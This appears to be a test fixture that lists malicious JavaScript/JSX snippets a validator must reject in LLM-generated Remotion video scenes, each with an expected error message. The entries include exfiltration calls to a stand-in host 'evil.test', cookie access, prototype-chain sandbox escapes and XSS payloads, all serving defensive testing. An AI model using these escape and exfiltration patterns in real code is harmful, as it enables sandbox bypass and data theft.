// Attacks the validator must reject (NFR-SEC-06, NFR-SEC-13). Each entry is a
// complete scene; the default export is present so only the attack is wrong.
// `expect` is a fragment of the error message the LLM gets back.

const scene = (body: string, imports = "import {AbsoluteFill} from 'remotion';") =>
	`${imports}\nexport default function S() {\n${body}\nreturn <AbsoluteFill />;\n}`;

export const MALICIOUS: {name: string; code: string; expect: RegExp}[] = [
	// ── Network and storage ──────────────────────────────────────────────────
	{name: 'fetch', code: scene("fetch('https://evil.test/?c=' + 1);"), expect: /"fetch" is not available/},
	{name: 'XMLHttpRequest', code: scene('new XMLHttpRequest();'), expect: /"XMLHttpRequest"/},
	{name: 'WebSocket', code: scene("new WebSocket('wss://evil.test');"), expect: /"WebSocket"/},
	{name: 'navigator.sendBeacon', code: scene("navigator.sendBeacon('x', 'y');"), expect: /"navigator"/},
	{name: 'localStorage', code: scene("localStorage.getItem('k');"), expect: /"localStorage"/},
	{name: 'indexedDB', code: scene("indexedDB.open('x');"), expect: /"indexedDB"/},
	{name: 'EventSource', code: scene("new EventSource('/x');"), expect: /"EventSource"/},
	{name: 'Worker', code: scene("new Worker('x.js');"), expect: /"Worker"/},
	{name: 'Image beacon', code: scene("new Image().src = 'https://evil.test';"), expect: /"Image"/},

	// ── Globals and code evaluation ─────────────────────────────────────────────
	{name: 'window', code: scene('window.location;'), expect: /"window"/},
	{name: 'document', code: scene('document.cookie;'), expect: /"document"/},
	{name: 'globalThis', code: scene('globalThis.fetch;'), expect: /"globalThis"/},
	{name: 'self', code: scene('self.fetch;'), expect: /"self"/},
	{name: 'top/parent', code: scene('top.location; parent.location;'), expect: /"top"/},
	{name: 'location', code: scene("location.href = 'https://evil.test';"), expect: /"location"/},
	{name: 'eval', code: scene("eval('1+1');"), expect: /"eval"/},
	{name: 'Function', code: scene("Function('return this')();"), expect: /"Function"/},
	{name: 'new Function', code: scene("new Function('a', 'return a');"), expect: /"Function"/},
	{name: 'setTimeout string', code: scene("setTimeout('alert(1)', 0);"), expect: /"setTimeout"/},
	{name: 'setInterval', code: scene('setInterval(() => 1, 5);'), expect: /"setInterval"/},
	{name: 'requestAnimationFrame', code: scene('requestAnimationFrame(() => 1);'), expect: /"requestAnimationFrame"/},
	{name: 'queueMicrotask', code: scene('queueMicrotask(() => 1);'), expect: /"queueMicrotask"/},
	{name: 'require', code: scene("require('fs');"), expect: /"require"/},
	{name: 'process', code: scene('process.env;'), expect: /"process"/},
	{name: 'Reflect', code: scene('Reflect.get({}, "a");'), expect: /"Reflect"/},
	{name: 'Proxy', code: scene('new Proxy({}, {});'), expect: /"Proxy"/},
	{name: 'Symbol', code: scene('Symbol.unscopables;'), expect: /"Symbol"/},
	{name: 'arguments', code: 'export default function S() { return arguments.length; }', expect: /"arguments"/},
	{name: 'Math.random (nondeterministic)', code: scene('Math.random();'), expect: /Math\.random is not available/},
	{name: 'Date (nondeterministic)', code: scene('Date.now();'), expect: /"Date"/},
	{name: 'console', code: scene('console.log(1);'), expect: /"console"/},
	{
		name: 'aliasing a global',
		code: scene('const O = Object; O.getPrototypeOf({});'),
		expect: /"Object" can't be used like this/,
	},
	{name: 'Object.defineProperty', code: scene('Object.defineProperty({}, "a", {});'), expect: /Object\.defineProperty/},
	{name: 'Object.getPrototypeOf', code: scene('Object.getPrototypeOf(1);'), expect: /Object\.getPrototypeOf/},
	{name: 'Object.fromEntries', code: scene("Object.fromEntries([['a', 1]]);"), expect: /Object\.fromEntries/},
	{name: 'JSON.parse', code: scene("JSON.parse('{}');"), expect: /JSON\.parse/},
	{name: 'calling Object', code: scene('Object(1);'), expect: /"Object" can't be used like this/},
	{name: 'computed global member', code: scene("Math['random']();"), expect: /"Math" can't be used like this/},
	{name: 'optional global member', code: scene('Math?.max(1);'), expect: /"Math" can't be used like this/},

	// ── Prototype-chain escapes ──────────────────────────────────────────────────
	{name: 'constructor chain', code: scene("(() => 1).constructor('return fetch')();"), expect: /"constructor"/},
	{name: 'literal constructor key', code: scene("[]['constructor'];"), expect: /"constructor"/},
	{name: '__proto__', code: scene('({}).__proto__;'), expect: /"__proto__"/},
	{name: 'prototype', code: scene('Array.prototype.map;'), expect: /"prototype"/},
	{name: 'React internals', code: scene('const el = <div />; el._owner;'), expect: /"_owner"/},
	{name: '$$typeof', code: scene('const el = <div />; el.$$typeof;'), expect: /"\$\$typeof"/},
	{name: 'DOM escape', code: scene('const x = {} as any; x.ownerDocument.defaultView;'), expect: /"ownerDocument"/},
	{name: 'optional chain escape', code: scene('const f = () => 1; f?.constructor;'), expect: /"constructor"/},
	{
		name: 'dynamic key',
		code: scene("const k = 'constr' + 'uctor'; ({} as any)[k];"),
		expect: /dynamic property access/,
	},
	{name: 'template key', code: scene('({} as any)[`constructor`];'), expect: /dynamic property access/},
	{name: 'destructure constructor', code: scene('const {constructor: F} = () => 1;'), expect: /"constructor"/},
	{name: 'computed destructure', code: scene("const k = 'a'; const {[k]: v} = {a: 1};"), expect: /computed keys/},
	{
		name: 'computed object key',
		code: scene("const k = 'dangerously' + 'SetInnerHTML'; const o = {[k]: 1};"),
		expect: /computed keys/,
	},
	{name: 'literal __proto__ key', code: scene("const o = {'__proto__': null};"), expect: /"__proto__"/},
	{
		name: 'object method named constructor',
		code: scene('const o = {constructor() { return 1; }};'),
		expect: /"constructor"/,
	},
	{name: 'this', code: 'export default function S() { return this; }', expect: /`this` is not allowed/},

	// ── Syntax that runs code or escapes ───────────────────────────────────────
	{name: 'dynamic import', code: scene("import('https://evil.test/x.js');"), expect: /dynamic import/},
	{name: 'tagged template', code: scene('String.raw`x`;'), expect: /tagged templates/},
	{name: 'with', code: 'export default function S(o) { with (o) { return 1; } }', expect: /./},
	{name: 'import.meta', code: scene('import.meta.url;'), expect: /import\.meta/},
	{name: 'class', code: 'class A {}\nexport default function S() { return null; }', expect: /classes are not allowed/},
	{name: 'class expression', code: scene('const A = class {};'), expect: /classes are not allowed/},
	{name: 'async', code: 'export default async function S() { return null; }', expect: /async functions/},
	{name: 'await', code: scene('const f = async () => { await 1; };'), expect: /async/},
	{name: 'generator', code: scene('function* g() { yield 1; }'), expect: /generators/},
	{name: 'debugger', code: scene('debugger;'), expect: /debugger/},
	{name: 'new.target', code: 'export default function S() { return new.target; }', expect: /new\.target/},

	// ── Imports and exports ────────────────────────────────────────────────────
	{name: 'import fs', code: scene('', "import fs from 'fs';"), expect: /import from "fs" is not allowed/},
	{name: 'import from url', code: scene('', "import x from 'https://evil.test/x.js';"), expect: /is not allowed/},
	{name: 'relative import', code: scene('', "import x from './secrets';"), expect: /is not allowed/},
	{
		name: 'remotion internals',
		code: scene('', "import {Internals} from 'remotion';"),
		expect: /"Internals" is not available/,
	},
	{name: 'react-dom', code: scene('', "import {createPortal} from 'react-dom';"), expect: /"react-dom"/},
	{
		name: 'useEffect (side effects)',
		code: scene('', "import {useEffect} from 'react';"),
		expect: /"useEffect" is not available/,
	},
	{name: 'namespace import', code: scene('', "import * as R from 'remotion';"), expect: /import \* as/},
	{name: 'default import of remotion', code: scene('', "import R from 'remotion';"), expect: /no default export/},
	{
		name: 'React internals via default',
		code: scene('React.__CLIENT_INTERNALS;', "import React from 'react';"),
		expect: /React\.__CLIENT_INTERNALS/,
	},
	{
		name: 'React.createElement',
		code: scene("React.createElement('script');", "import React from 'react';"),
		expect: /React\.createElement/,
	},
	{name: 'aliasing React', code: scene('const R = React;', "import React from 'react';"), expect: /use React only as/},
	{
		name: 'computed React member',
		code: scene("React['useEffect'];", "import React from 'react';"),
		expect: /use React only as/,
	},
	{
		name: 'import require',
		code: "import x = require('fs');\nexport default function S() { return null; }",
		expect: /import x = require/,
	},
	{
		name: 'named export',
		code: 'export const a = 1;\nexport default function S() { return null; }',
		expect: /only `export default`/,
	},
	{
		name: 're-export',
		code: "export * from 'remotion';\nexport default function S() { return null; }",
		expect: /re-exports/,
	},
	{name: 'no default export', code: 'function S() { return null; }', expect: /exactly one `export default`/},
	{name: 'export =', code: 'const S = () => null;\nexport = S;', expect: /./},
	{
		name: 'namespace',
		code: 'namespace N { export const a = 1; }\nexport default function S() { return null; }',
		expect: /namespaces/,
	},
	{
		name: 'declare global',
		code: 'declare global { var x: number }\nexport default function S() { return null; }',
		expect: /namespaces/,
	},
	{
		name: 'reserved require binding',
		code: scene('', "import {AbsoluteFill} from 'remotion';\nconst require = 1;"),
		expect: /"require" is reserved/,
	},
	{
		name: 'reserved helper binding',
		code: scene('', "import {AbsoluteFill} from 'remotion';\nconst _interopRequireDefault = 1;"),
		expect: /reserved/,
	},

	// ── JSX ──────────────────────────────────────────────────────────────────
	{name: 'script element', code: 'export default () => <script>alert(1)</script>;', expect: /<script> is not allowed/},
	{name: 'iframe', code: "export default () => <iframe src='https://evil.test' />;", expect: /<iframe>/},
	{name: 'img beacon', code: "export default () => <img src='https://evil.test/x.png' />;", expect: /<img>/},
	{name: 'link', code: "export default () => <link rel='stylesheet' href='https://evil.test' />;", expect: /<link>/},
	{name: 'style element', code: 'export default () => <style>{"@import url(//evil.test)"}</style>;', expect: /<style>/},
	{name: 'foreignObject', code: 'export default () => <svg><foreignObject /></svg>;', expect: /<foreignObject>/},
	{name: 'svg use', code: "export default () => <svg><use href='https://evil.test#x' /></svg>;", expect: /<use>/},
	{name: 'anchor', code: "export default () => <a href='javascript:alert(1)'>x</a>;", expect: /<a>/},
	{
		name: 'innerHTML',
		code: "export default () => <div dangerouslySetInnerHTML={{__html: '<img onerror=alert(1)>'}} />;",
		expect: /dangerouslySetInnerHTML/,
	},
	{name: 'event handler', code: "export default () => <div onClick={() => fetch('x')} />;", expect: /"onClick"/},
	{name: 'ref (DOM access)', code: 'export default () => <div ref={(el) => el} />;', expect: /"ref"/},
	{name: 'href on svg', code: "export default () => <svg><path href='x' /></svg>;", expect: /"href"/},
	{name: 'xlinkHref', code: "export default () => <svg><path xlinkHref='x' /></svg>;", expect: /"xlinkHref"/},
	{name: 'custom element', code: 'export default () => <x-evil />;', expect: /<x-evil>/},
	{
		name: 'JSX member other than Series.Sequence',
		code: "import {Series} from 'remotion';\nexport default () => <Series.Internals />;",
		expect: /only <Series\.Sequence>/,
	},
	{
		name: 'JSX member on local',
		code: 'const X = {Y: () => null};\nexport default () => <X.Y />;',
		expect: /only <Series\.Sequence>/,
	},
	{
		name: 'namespaced attribute',
		code: "export default () => <svg><path xlink:href='x' /></svg>;",
		expect: /namespaced JSX/,
	},
	{
		name: 'nested JSX member',
		code: "import {Series} from 'remotion';\nexport default () => <Series.Sequence.X />;",
		expect: /only <Series\.Sequence>/,
	},
	{
		name: 'string import name',
		code: scene('', "import {'Internals' as I} from 'remotion';"),
		expect: /"Internals" is not available/,
	},
	{name: 'namespaced JSX', code: 'export default () => <svg:rect />;', expect: /namespaced JSX/},
	{
		name: 'spread with innerHTML',
		code: "export default () => <div {...{dangerouslySetInnerHTML: {__html: 'x'}}} />;",
		expect: /dangerouslySetInnerHTML/,
	},

	// ── Limits ────────────────────────────────────────────────────────────────
	{name: 'too big', code: scene(`const s = '${'x'.repeat(31 * 1024)}';`), expect: /under 30 KB/},
	{name: 'syntax error', code: 'export default () => <div>;', expect: /syntax error/},
];
